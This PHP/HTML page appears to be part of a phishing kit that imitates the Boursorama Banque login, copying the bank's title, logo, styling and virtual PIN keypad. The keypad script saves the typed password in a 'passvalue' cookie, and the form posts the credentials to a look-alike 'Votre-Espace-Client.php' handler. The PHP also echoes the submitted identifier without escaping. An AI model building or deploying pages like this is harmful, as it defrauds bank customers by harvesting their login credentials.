<?php
// Start the session
session_start();
$_SESSION['identifiant']= $_POST['identifiant'];
?>

<!DOCTYPE html>
<html lang="fr-FR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="ressources/apple-touch-icon-60x60.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src='https://kit.fontawesome.com/a076d05399.js'></script>
    <link rel="shortcut icon" href="boursorama.ico" type="image/x-icon">
    <title>Espace Client : accédez à vos comptes - Boursorama Banque</title>
</head>

<style>
    @import url(https://fonts.googleapis.com/css?family=Open+Sans:300);
     
    #form_clientNumber{
         letter-spacing: 10px;
     }
     .monIdentifiant{
         font-size: 15px;
         padding-left: 10px;
         padding-top: 7px;
     }
     body{
         background-color: #e7f3fd;
         font-family: 'ProximaNova', Arial, Helvetica, sans-serif;
         user-select: none;
     }#one{
         margin-left: 530px;
     }.login-form{
         background-color: white;
         width: 485px;
         height: 600px;
         margin-left: 380px;
         border-radius: 20px;
     }#deco{
         background-color: #e2017b;;
         height: 10px;
     }.u-text-center {
         text-align: center !important;
     }.narrow-modal__title {
         font-weight: 100;
         font-size: 1.8rem;
         margin-top: 0;
         color: #003883;
         margin-bottom: -0.5rem;
         margin-top: -10px;
     }.identifiant{
        font-size:13px;
        padding-left:0px;
        letter-spacing:2px;
        color:#006fb7;
        font-weight:200px;
     }#identifiant,#passe{
         margin-left: 70px;
         height: 30px;width: 350px;
         border-top-style: hidden;
       border-right-style: hidden;
       border-left-style: hidden;
       border-bottom-color:#006fb7;
       outline: none;
     }.input::placeholder{
         font-size: 15px;
         color:#006fb7;
     }.input{
         font-size: 16px;color:#006fb7;letter-spacing: 5px;
     }a{
         color: blue ;
         padding-left: 180px;
     }#memo{
         padding-left: 130px;
         color:#006fb7;
         font-size: 20px;
     }#submit{
    height: 44px;width: 300px;margin-left: 80px;text-align: center;
    font-size: 15px;border-radius: 5px;cursor: pointer;
    color: white;background-color: #e2017b;border: #e2017b;
    outline:none;
    }#submit:hover{
    background-color:#FF1493	;
    }#submit:active{
    background-color:#B4145A;
    outline:none;
}p{
         padding-left: 375px;
         color: black;
     }#none:link{
         text-decoration: none;
         color: black;
     }
     #id{
         margin-left: -167px;
         color: #003883;
         font-weight: 500;
     }
     #monid{
         color: #006fb7;
         font-size:14px;
         font-weight: 500;
     }
     #monid:hover{
         color: #009de0;
     }
     #id a{
         text-decoration: none;
     }
          
     body{
         font-family: 'ProximaNova', Arial, Helvetica, sans-serif;
     }
     .keypadwrapper {
         text-align: center;
         width: 100%;
           margin-left: 0px;
    }
    .keypadwrapper .inputwrapper {
         margin: 1.5em;
         line-height: 0.41em;
         vertical-align: middle;
         text-align: center;
    }
       .keypadwrapper .numberinput {
         display: inline-block;position: relative;
         height: 12.5px;
         width: 13px;
         border-radius: 38px;
         border: 0.15px solid rgba(102,126,155,0.3);
         margin-right: 2%;margin-bottom: 8px;
         margin-left: 1%;
         font-size: 30px;
         text-align: center;
       }
       .lineone, .linetwo{
         padding-left: 22px;
     }
     .minbox{
         border: 1px hidden whitesmoke;
         text-align: center;height: 50px;width: 60px;
         display: inline-block;
         padding-top: 5px;border-radius: 50px;
         margin-left: 20px;margin-bottom: 20px;margin-bottom: 3px;
         cursor: pointer;     box-shadow: 0 0.1rem 0.3rem 0 rgba(102,126,155,0.3);
         user-select: none;
     }
     .minbox:hover{
         box-shadow: 0 0.3rem 0.7rem 0.3rem rgba(102,126,155,0.3);
     }
     .nocircle {
        width: auto !important;
        border: none !important;
        height: auto !important;
    }
     .sup{
         font-size: 25px;
         color: #003883;
         font-weight: 100;
     }
     .down{
         color: #003883;letter-spacing: 1px;font-size: 10px;
         margin-bottom: 10px;
     }
     #down1,#down2{
         color: white;}
     .svg{
         fill: #003883;
         cursor: grabbing;
         padding-left: 4px;margin-top: 10px;margin-bottom:5px;
     }
     .svg:hover{
         fill: blue;
         cursor: pointer;
     }
     
     /* toggle in label designing */ 
     .toggle { 
         position : relative ; 
         display : inline-block; 
         width : 55px; 
         height : 25px; 
         background-color:white; 
         border-radius: 50px; 
         border: 1px solid rgba(102,126,155,0.3); 
         margin-bottom: 1px;
     } 
     .toggle:hover{
         cursor: pointer;
     }
             
     /* After slide changes */ 
     .toggle:after { 
         content: ''; 
         position: absolute; 
         width: 23px; 
         height: 23px; 
         border-radius: 50%; 
         background-color: rgba(102,126,155,0.3); 
         top: 1px;  
         left: 1px; 
         transition:  all 0.5s; 
     }      
     /* Toggle text */ 
     p { 
         font-weight: bold; 
     }         
     /* Checkbox cheked effect */ 
     .checkbox:checked + .toggle::after { 
         left : 30px;  
         background-color: #009de0;
     }         
     /* Checkbox cheked toggle label bg color */ 
     .checkbox:checked + .toggle { 
         border-color: #009de0;
         background-color: white;
         color: #009de0;
     }    
     /* Checkbox vanished */ 
     .checkbox {  
         display : none; 
     } 
     .vocalisation{
         padding-left: 140px;
         display: inline-block;
     }
     .vocal{
         display: inline-block;
     }
     #vocalisationtext{
         font-size: 12px;position: absolute;
         margin-left: 10px;
         text-align: center;
         padding-bottom: 10px;
         color: #667e9b;font-weight: 400px;
         cursor: pointer;margin-bottom: 10px;
     }
     i{
         padding-left: 12px;
         color: rgba(10, 10, 10, 0.61);
         font-size: 30px;
     }
     i:active{
         color: #003883;
     }
     #none{
         color:#667e9b;font-size: 15px;font-weight: 530;
    text-align: center;
     }
     #second{
         color: #009de0;
         font-size: 14px;
         text-align: center;
     }
     #second:link{
         text-decoration: none;
     }
     .imgRotate{
    transform: rotate(50deg);
}
#rotateImg{
  font-size: 60px;padding-left: 214px;color: #e9ecf0;
}
.rienFaire{
    display: none;
  }
</style>

<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.1/jquery.min.js'></script>

<body>
    <script id="rendered-js">
        $(function () {
        $(".minbox").click(function () {
        
          var value = $(this).find(".sup").text();

          if (value !== "") {
            $(".numberinput").each(function () {
              var a = $(this).text();
              if (!a) {   
                $(this).html(value);
                $(this).addClass("nocircle");
                $(this).css({'color':'#006FB7','border': 'solid 2px #006FB7','background-color':'#006FB7','border-radius': '55%','font-weight': 'bolder','border-width': '4px','box-sizing': 'content-box','border-bottom-width':'1px' });
                return false;
              }
            });
          } else {
            $($(".numberinput").get().reverse()).each(function () {
              var a = $(this).text();
              if (a) {
                $(this).text("");
                $(this).removeClass("nocircle");
                return false;
                }
            });
          };
    });
});
    </script>


    <br><br><br>
    <svg xmlns="http://www.w3.org/2000/svg" id="one" role="img" aria-labelledby="svgLogoId" width="182.302" height="41.299" viewBox="0 0 182.302 41.299"><title id="svgLogoId">Logo Boursorama Banque</title><path fill="#d20073" d="M103.075.4h3.257c2.878,0,4.016.285,5.123,1.265a4.259,4.259,0,0,1,1.423,3.1,3.4,3.4,0,0,1-1.834,3.194A3.844,3.844,0,0,1,113.32,9.7a4.7,4.7,0,0,1,.569,2.372,4.7,4.7,0,0,1-2.846,4.4,8.993,8.993,0,0,1-3.51.538h-4.427Zm4.048,6.451c1.834,0,2.656-.569,2.656-1.8,0-1.138-.885-1.8-2.4-1.8H106.11v3.6Zm.569,7.3c2.15-.063,3.131-.727,3.131-2.182,0-1.391-1.138-2.214-3.036-2.214h-1.613v4.4ZM122.68,4.163a6.641,6.641,0,0,1-.032,13.281,6.641,6.641,0,1,1,.032-13.281Zm0,10.53a3.7,3.7,0,0,0,3.6-3.858,3.647,3.647,0,1,0-7.273-.063A3.714,3.714,0,0,0,122.68,14.693ZM142.507,4.542V17.033h-2.751V15.8a3.653,3.653,0,0,1-3.257,1.644,5.322,5.322,0,0,1-3.6-1.36c-1.138-1.012-1.549-2.182-1.549-4.206v-7.3h3V10.93c0,2.5.885,3.763,2.53,3.763,1.708,0,2.593-1.265,2.593-3.763V4.542Zm3.289,0h2.751V5.649c.885-1.138,2.719-1.36,3.921-1.36V7.041c-1.834.063-3.668,1.012-3.668,3v6.988h-3Zm33.678,0h2.751V5.649c.885-1.138,2.719-1.36,3.921-1.36V7.041c-1.834.063-3.668,1.012-3.668,3v6.988h-3ZM158.255,14.693a1.287,1.287,0,0,0,1.36-1.233c0-.759-.443-1.107-2.119-1.644a4.813,4.813,0,0,1-2.34-1.17,3.31,3.31,0,0,1-1.138-2.656,4.137,4.137,0,0,1,8.253-.032h-2.909a1.144,1.144,0,0,0-1.17-1.075,1.106,1.106,0,0,0-1.17,1.044c0,.569.316.885,1.3,1.17l.854.253a6.526,6.526,0,0,1,2.308,1.107,3.239,3.239,0,0,1,1.17,2.656,4.425,4.425,0,0,1-4.554,4.3,4.306,4.306,0,0,1-3.953-2.308,4.939,4.939,0,0,1-.506-2.024h3.036c.253,1.17.727,1.613,1.581,1.613Zm12.364-10.53a6.641,6.641,0,0,1-.032,13.281,6.641,6.641,0,1,1,.032-13.281Zm0,10.53a3.7,3.7,0,0,0,3.6-3.858,3.647,3.647,0,1,0-7.273-.063A3.714,3.714,0,0,0,170.619,14.693Zm28.744,2.34h-2.751V15.515a6.279,6.279,0,0,1-4.364,1.929c-3.478,0-6.071-2.814-6.071-6.672a6.286,6.286,0,0,1,6.23-6.577,5.575,5.575,0,0,1,4.206,1.992V4.606l2.751-.032ZM192.881,6.883a3.767,3.767,0,0,0-3.7,3.953,3.691,3.691,0,1,0,7.368-.095A3.678,3.678,0,0,0,192.881,6.883Zm9.9-2.34h2.751V5.586a3.894,3.894,0,0,1,3.32-1.455,4.2,4.2,0,0,1,3.6,1.961,4.536,4.536,0,0,1,4.016-1.961c3.225,0,5.06,2.024,5.06,5.6V17h-3V10.14c0-2.15-.791-3.257-2.372-3.257-1.739,0-2.53,1.2-2.53,3.921v6.23h-3V10.14c0-2.087-.885-3.257-2.5-3.257-1.676,0-2.372,1.138-2.372,3.921v6.23h-2.972Zm33.678,12.491h-2.751V15.515a6.279,6.279,0,0,1-4.364,1.929c-3.478,0-6.071-2.814-6.071-6.672a6.286,6.286,0,0,1,6.23-6.577,5.575,5.575,0,0,1,4.206,1.992V4.606l2.751-.032ZM229.974,6.883a3.767,3.767,0,0,0-3.7,3.953,3.691,3.691,0,1,0,7.368-.095A3.678,3.678,0,0,0,229.974,6.883ZM91.691,6.124v.411a6.234,6.234,0,0,1-1.9,4.364l-2.688,2.72L79.2,21.555v9.8a6.264,6.264,0,1,0,12.522,0V6.724C91.722,6.535,91.691,6.313,91.691,6.124Z" transform="translate(-54.155 -0.274)"></path><path fill="#00c2f0" d="M16.33,39.5,1.784,54.046a6.355,6.355,0,0,0,.095,8.7L25.09,39.5Z" transform="translate(-0.077 -27.009)"></path><path fill="#00b0eb" d="M5.8,62.742a6.348,6.348,0,0,0,8.664.095l.253-.253L29.011,48.323V39.5h-.032Z" transform="translate(-3.966 -27.009)"></path><path fill="#0079bc" d="M87.106,36.383,89.857,33.6a6.525,6.525,0,0,1-4.617,1.9H79.2v8.791Z" transform="translate(-54.155 -22.975)"></path><path fill="#d20073" d="M30.579.1H6.451A6.332,6.332,0,0,0,0,6.329,6.379,6.379,0,0,0,6.451,12.59h9.8L26.626,2.218A6.2,6.2,0,0,1,30.579.1Z" transform="translate(0 -0.068)"></path><path fill="#0079bc" d="M60.191,10.874v-.6a.285.285,0,0,1,.032-.158v-.032l.095-.569A6.325,6.325,0,0,1,61.772,6.7L51.4,17.072h8.791v-6.2Z" transform="translate(-35.146 -4.581)"></path><path fill="#05418a" d="M79.2,6.419v6.1h6.135A6.432,6.432,0,0,0,91.786,6.2a1.552,1.552,0,0,1-.032-.348,8.847,8.847,0,0,0-.19-.885A6.27,6.27,0,0,0,85.461,0h-.7a6.158,6.158,0,0,0-3.953,2.087A6.108,6.108,0,0,0,79.326,4.87c-.032.19-.063.348-.095.538v.032A.285.285,0,0,1,79.2,5.6" transform="translate(-54.155)"></path><g transform="translate(48.919 20.712)"><path fill="#1e3581" d="M159.317,79.129h-1.549V74.765h1.613c1.9,0,3.036.822,3.036,2.214,0,1.423-.949,2.119-3.1,2.15m-1.549-10.815h1.265c1.518,0,2.372.632,2.372,1.8,0,1.2-.854,1.8-2.656,1.8h-.98Zm4.87,4.68a3.388,3.388,0,0,0,1.834-3.162,4.191,4.191,0,0,0-1.423-3.067c-1.107-.98-2.214-1.265-5.091-1.265H154.7V82.038h4.427a8.992,8.992,0,0,0,3.51-.538,4.892,4.892,0,0,0,2.277-6.736,3.661,3.661,0,0,0-2.277-1.771" transform="translate(-154.7 -65.5)"></path><path fill="#1e3581" d="M200.672,87.63a3.913,3.913,0,0,1,0-7.811,3.635,3.635,0,0,1,3.637,3.858,3.681,3.681,0,0,1-3.637,3.953m3.7-8.538A5.459,5.459,0,0,0,200.2,77.1a6.253,6.253,0,0,0-6.2,6.546c0,3.858,2.561,6.641,6.04,6.641a6.249,6.249,0,0,0,4.332-1.9v1.518h2.719v-12.4l-2.719.032Z" transform="translate(-181.573 -73.432)"></path><path fill="#1e3581" d="M250.766,77.1a4.648,4.648,0,0,0-3.415,1.455V77.479H244.6v12.4h2.972v-5.85a6.865,6.865,0,0,1,.316-2.688,2.455,2.455,0,0,1,2.245-1.518c1.676,0,2.5,1.3,2.5,3.984v6.1H255.6V83.235a7.44,7.44,0,0,0-.632-3.6,4.7,4.7,0,0,0-4.206-2.53" transform="translate(-216.172 -73.432)"></path><path fill="#1e3581" d="M291.641,87.6a3.881,3.881,0,0,1,0-7.747,3.884,3.884,0,0,1,0,7.747m3.668-8.506a4.635,4.635,0,0,0-4.016-1.992,6.6,6.6,0,0,0-.032,13.186,4.875,4.875,0,0,0,3.795-1.581v5.313h2.973V77.511h-2.72Z" transform="translate(-243.796 -73.432)"></path><path fill="#1e3581" d="M343,84.756c0,2.467-.885,3.763-2.593,3.763-1.676,0-2.53-1.265-2.53-3.763V78.432H334.9V85.7c0,2.024.411,3.162,1.549,4.206a5.271,5.271,0,0,0,3.573,1.328,3.6,3.6,0,0,0,3.225-1.644v1.2h2.719V78.4H343Z" transform="translate(-277.917 -74.321)"></path><path fill="#1e3581" d="M379.7,82.5a3.6,3.6,0,0,1,3.51-2.909,3.539,3.539,0,0,1,3.478,2.909Zm9.929.949a6.533,6.533,0,0,0-6.419-6.546,6.616,6.616,0,0,0-6.514,6.736,6.526,6.526,0,0,0,6.546,6.577,6.326,6.326,0,0,0,5.724-3.7h-3.51a2.971,2.971,0,0,1-2.308,1.012,3.453,3.453,0,0,1-3.289-2.561h9.582a8.822,8.822,0,0,0,.19-1.518" transform="translate(-306.499 -73.295)"></path></g></svg>
    <br><br><br>
    <div class="login-form">
       <div id="deco"></div><br>
       <span id="id"><a href="identifiant.php" id="monid"> <i class='fas fa-chevron-left' style='font-size:14px;color:#006fb7;'></i> Mon identifiant</a></p></span>
       <br>
       <div class="imgRotate"><i class="fas fa-arrow-alt-circle-up " id="rotateImg"></i></div>
       <center><p class="identifiant" > <?php  echo $_SESSION['identifiant']; ?> </p></center>
<form action="Votre-Espace-Client.php" method="post">
       <h2 class="narrow-modal__title u-text-center  ">
        Mon mot de passe    </h2>
       <div class="keypadwrapper">
        <div class="inputwrapper" id='inputwrapper'>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <span class="numberinput"></span>
            <svg xmlns="http://www.w3.org/2000/svg" class='svg' id="" width="20" height="20" viewBox="0 0 7.937 7.937"><path d="M2.53 5.986l.116.114.087.086.035.033.015.018a.956.956 0 0 0 .242.175.988.988 0 0 0 .283.093 2.223 2.223 0 0 0 .34.03l.068.001h2.097v.474-.47h.202c.044 0 .08 0 .166-.004a2.214 2.214 0 0 0 .335-.03.98.98 0 0 0 .285-.093.94.94 0 0 0 .239-.173A.984.984 0 0 0 7.214 6a1.033 1.033 0 0 0 .095-.285 2.28 2.28 0 0 0 .029-.339 5.852 5.852 0 0 0 .002-.164V2.654l-.001-.128a2.257 2.257 0 0 0-.03-.334 1.033 1.033 0 0 0-.093-.285.959.959 0 0 0-.175-.24.943.943 0 0 0-.241-.174.982.982 0 0 0-.285-.094 2.05 2.05 0 0 0-.337-.03 5.163 5.163 0 0 0-.163-.002H3.716l-.072.002a2.025 2.025 0 0 0-.333.029.988.988 0 0 0-.284.094.971.971 0 0 0-.246.18l-.043.044a5.201 5.201 0 0 0-.208.206l-.793.793a.294.294 0 0 0-.023.02l-.019.02a2.618 2.618 0 0 0-.077.076l-.702.701-.015.015-.016.017-.034.034-.047.048a1.698 1.698 0 0 0-.146.162l-.018.02a.145.145 0 0 0-.025.033.327.327 0 0 0 0 .175.177.177 0 0 0 .03.041c.054.068.102.119.153.17l.013.014.014.013.026.027.034.034.034.034.7.7.067.068.046.045a.262.262 0 0 1 .023.022zm1.33-3.2a.204.204 0 0 0-.026-.035.204.204 0 0 0-.287.284l-.004.004.915.915-.88.88a.204.204 0 1 0 .251.315l.004.004.911-.913.914.912.002-.003a.204.204 0 0 0 .285-.286.2.2 0 0 0-.028-.026l-.885-.881.91-.92a.204.204 0 0 0-.287-.285.204.204 0 0 0-.022.027l-.889.889zM1.411 5.53l-.056-.055-.068-.068-.7-.702-.034-.033-.035-.035-.03-.03-.025-.025a2.486 2.486 0 0 1-.167-.185.647.647 0 0 1-.116-.177l-.01-.023a.796.796 0 0 1 0-.488l.008-.021a.616.616 0 0 1 .118-.179 1.994 1.994 0 0 1 .163-.18 1.111 1.111 0 0 1 .06-.061l.031-.032.018-.018.017-.018.698-.696c.02-.023.041-.042.072-.071l.027-.031.03-.03.782-.781.116-.116a6.006 6.006 0 0 1 .143-.142 1.428 1.428 0 0 1 .36-.262A1.457 1.457 0 0 1 3.23.935a2.469 2.469 0 0 1 .404-.037l.068-.002h2.309c.051 0 .09 0 .17.003a2.495 2.495 0 0 1 .407.036 1.449 1.449 0 0 1 .42.138 1.412 1.412 0 0 1 .36.262 1.43 1.43 0 0 1 .261.36 1.51 1.51 0 0 1 .139.42 2.717 2.717 0 0 1 .033.4c0 .04 0 .069.003.133v2.565c0 .055 0 .112-.003.173a2.738 2.738 0 0 1-.036.407 1.51 1.51 0 0 1-.138.421 1.46 1.46 0 0 1-.26.358 1.412 1.412 0 0 1-.36.26 1.45 1.45 0 0 1-.42.14 2.67 2.67 0 0 1-.403.035 5.788 5.788 0 0 1-.177.004H5.81v-.47.47H3.7l-.065-.001a2.678 2.678 0 0 1-.407-.036 1.46 1.46 0 0 1-.42-.139 1.414 1.414 0 0 1-.355-.256l-.032-.033-.013-.014a6.538 6.538 0 0 1-.215-.213l-.761-.76z"></path></svg>    </div>
        
            </div>
    <div class="keyboard">
        <div class="lineone">
                <div class="minbox">
                <span class="sup">1 <br></span>
                <span class="down" id="down1">1</span>
            </div>

            <div class="minbox">
                <span class="sup">2 <br></span>
                <span class="down">ABC</span>
            </div>
            <div class="minbox">
                <span class="sup">3<br></span>
                <span class="down">DEF</span>
            </div>
            <div class="minbox">
                <span class="sup">4<br></span>
                <span class="down">GHI</span>
            </div>
            <div class="minbox">
                <span class="sup">5<br></span>
                <span class="down">JKL</span>
            </div>
        </div>
            <br>
        <div class="linetwo">
            <div class="minbox">
                <span class="sup">6<br></span>
                <span class="down">MNO</span>
            </div>
            <div class="minbox">
                <span class="sup">7<br></span>
                <span class="down">PQRS</span>
            </div>
            <div class="minbox">
                <span class="sup">8<br></span>
                <span class="down">TUV</span>
            </div>
            <div class="minbox">
                <span class="sup">9<br></span>
                <span class="down">WXYZ</span>
            </div>
            <div class="minbox">
                <span class="sup">0<br></span>
                <span class="down" id="down2">0    </span>
            </div>
        </div>
    </div>
    <br><br><div class="vocalisation">
        <div id="vocalisationtoogle" class="vocal"><input type="checkbox" id="switch"
            class="checkbox" /> <label for="switch" class="toggle"></label> <label for="" id="vocalisationtext">Activer la vocalisation <i class="fa fa-question-circle fa-2x" id="circle"></i></label></div>
            </div>
    
        <br><br><br>
        <input type="submit" value="Je me connecte" id="submit" onclick='pass()'><br><br>
        <a href="https://clients.boursorama.com/connexion/mot-de-passe/retrouver/5fa5733e04c70/1" target="_blank" id="second">Mot de passe oublié ?</a>
        </div>

<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
<script>

        function pass(){
            var pass= document.getElementById('inputwrapper');
            var password=  pass.textContent;
            Cookies.set('passvalue', password, { expires: 7 });
        }
        
</script>


</form>
        <p><a id="none" href="">Aide & Opposition CB</a></p>

</body>
</html>